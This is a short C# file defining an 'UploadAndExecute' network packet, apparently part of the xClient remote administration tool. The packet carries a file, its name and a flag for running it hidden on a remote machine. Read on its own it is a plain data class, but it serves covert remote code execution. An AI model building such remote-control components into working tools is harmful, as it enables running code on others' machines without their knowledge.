using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class UploadAndExecute : IPacket
    {
        [ProtoMember(1)]
        public byte[] FileBytes { get; set; }

        [ProtoMember(2)]
        public string FileName { get; set; }

        [ProtoMember(3)]
        public bool RunHidden { get; set; }

        public UploadAndExecute() { }
        public UploadAndExecute(byte[] filebytes, string filename, bool runhidden)
        {
            this.FileBytes = filebytes;
            this.FileName = filename;
            this.RunHidden = runhidden;
        }

        public void Execute(Client client)
        {
            client.Send<UploadAndExecute>(this);
        }
    }
}
